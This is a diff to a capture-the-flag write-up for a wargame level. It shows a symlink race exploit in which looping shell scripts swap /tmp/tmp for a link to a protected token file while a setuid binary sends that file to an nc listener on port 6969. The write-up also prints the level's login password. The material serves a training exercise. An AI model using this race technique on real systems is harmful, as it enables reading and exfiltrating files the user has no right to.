@@ -7,7 +7,8 @@ Login
 > Password: s5cAJpM8ev6XHw998pRWG728z
 ```
 
-Tryout
+<details><summary>Tryout</summary>
+
 - 2 files, seen it before
 - try - `cat` - `./level10` - `./level10 token localhost`
 
@@ -26,6 +27,8 @@ cat: token: Permission denied
 > ./level10 token localhost
 You don't have access to ./token
 ```
+
+</details>
 
 Problem
 - The main issue here is file `./token` - we dont have its permission
@@ -88,7 +91,7 @@ Sending file .. wrote file!
 - we want it to open/read/send the `token` instead!
 
 ```b
-> ltrace ./level10 /tmp/tmp $(ifconfig | grep 'inet ' | awk 'NR==2 {print $2}' | cut -d ":" -f2)
+> ltrace ./level10 /tmp/tmp $(ifconfig|grep 'inet '|awk 'NR==2 {print $2}'|cut -d ":" -f2)
 .
 .
 .
@@ -122,38 +125,33 @@ Solution:
 `alternate.sh`
 
 ```b
-#!/bin/bash
-
 rm -rf /tmp/tmp
 t=/tmp/tmp
-
 while true; do
   touch $t
   rm -rf $t
   ln -s /home/user/level10/token $t
   rm -rf $t
 done
-
 ```
 
 `runner.sh`
 
 ```b
-#!/bin/bash
-
-while true; do
-  /home/user/level10/level10 /tmp/tmp 127.0.0.1 >/dev/null
+while true; do  
+  /home/user/level10/level10 /tmp/tmp $(ifconfig|grep 'inet '|awk 'NR==2 {print $2}'|cut -d ":" -f2) >/dev/null
+  #/home/user/level10/level10 /tmp/tmp $(hostname -I|cut -d' ' -f2) >/dev/null
 done
 ```
-
-- Run `alternate.sh` `runner.sh` and `nc -kl` at the same time
-
 ```b
+> chmod 777 /tmp/alt.sh /tmp/go.sh
+
+> \
 bash /tmp/alt.sh 2>/dev/null & \
 bash /tmp/go.sh  2>/dev/null & \
-nc -kl 6969 | grep -v '[][()]'
-	OR
 nc -kl 6969 | grep -E '[a-z0-9]'
+	OR
+nc -kl 6969 | grep -v '[][()]'
 
-*** kill $(jobs -p)
+> kill $(jobs -p)
 ```
